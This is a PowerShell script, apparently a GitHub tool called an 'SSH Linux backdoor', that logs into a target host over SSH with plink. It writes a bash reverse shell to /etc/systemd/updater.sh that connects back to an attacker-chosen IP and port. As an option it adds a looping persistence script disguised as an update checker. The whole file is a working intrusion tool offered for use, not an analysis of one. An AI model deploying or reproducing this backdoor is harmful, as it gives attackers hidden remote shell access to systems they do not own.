# CyberYom
# Make sure to accept the host key before running this
# commands are not prefixed with sudo
# Backdoor is called updater.sh
# Persistence script is called updatechecker.sh

param(
    [string]$hostip,
    [string]$hostport,
    [string]$targetip,
    [string]$targetport,
    [string]$password,
    [string]$user,
    [int]$sleep,
    [switch]$help  
)

if ($help) {
    Write-Host " Welcome to the SSH Linux backdoor."
    Write-Host "`nUsage: .\Injector.ps1 -hostip <IP> -hostport <port> -targetip <IP> -user <username> -password <password> [-sleep <seconds>]"
    Write-Host "Options:"
    Write-Host "  -hostip      IP address of the host system"
    Write-Host "  -hostport    Port on the host system"
    Write-Host "  -targetip    Target system's IP address"
    Write-Host "  -targetport  Target systems port (for SSH) "
    Write-Host "  -password    Password for the SSH user"
    Write-Host "  -user        Username for SSH"
    Write-Host "  -sleep       Optional: Time in seconds to wait between attempting connections"
    Write-Host "`nOptionally, you can run it by itself and enter each feild into the script."
    Write-Host "Usage: .\Injector.ps1"
    Write-Host "`n`nVersion: 1.0"
    Write-Host "Author: CyberYom"
    Write-Host "Visit the GitHub page for more information and updates."
    exit
}

if (-not $hostip) {
    $hostip = Read-Host "Enter the host IP address"
}
if (-not $hostport) {
    $hostport = Read-Host "Enter the host port"
}
if (-not $targetip) {
    $targetip = Read-Host "Enter the target IP address"
}
if (-not $targetport) {
    $targetport = Read-Host "Enter the target port (Enter for default, 22)"
    if (-not $targetport) {
        $targetport = 22
    }
}
if (-not $user) {
    $user = Read-Host "Enter the username for SSH"
}
if (-not $password) {
    $password = Read-Host "Enter the password for SSH"
}
if (-not $sleep) {
    $sleep = Read-Host "Enter the sleep time in seconds (Press Enter to skip)"
    if (-not $sleep) {
        $sleep = 0 
    }
}


# set the path for the backdoor here
$path = "/etc/systemd"
$backdoor = "/bin/bash -i >& /dev/tcp/$hostip/$hostport 0>&1"
$persistence = @'
#!/bin/bash
logFile=\"/var/log/update.log\"
touch /var/log/update.log
echo \"Starting updater script loop...\" >> $logFile
while true; do
    echo $(date \"+%Y-%m-%d %H:%M:%S\") - \"Attempting to run updater.sh\" >> $logFile
    /etc/systemd/updater.sh >> \$logFile 2>&1
    if [ \$? -ne 0 ]; then
        echo $(date \"+%Y-%m-%d %H:%M:%S\") - \"Failed to execute updater.sh\" >> $logFile
    fi
    sleep 5
done &
'@ -replace "`r`n", "`n" 



$commands = @(
    "touch $path/updater.sh",
    "echo '$backdoor' > $path/updater.sh",
    "chmod +x $path/updater.sh"
)

if ($sleep -gt 0) {
    $commands += "touch $path/updatechecker.sh"
    $commands += "echo -e '$persistence' > $path/updatechecker.sh"
    $commands += "chmod +x $path/updatechecker.sh"
    $commands += "$path/updatechecker.sh"
} else {
    $commands += "$path/updater.sh"
}

$commandJoined = $commands -join "; "

$plinkPath = "plink"

Write-Host ""
Write-Host "Connecting To Host..."
Write-host "    Connected."

Write-Host ""
Write-Host "Planting Backdoor..."
Write-Host "    Planted."

& $plinkPath -ssh -P $targetport -batch -l $user -pw $password $targetip $commandJoined

Write-Host ""
Write-Host "Exiting..."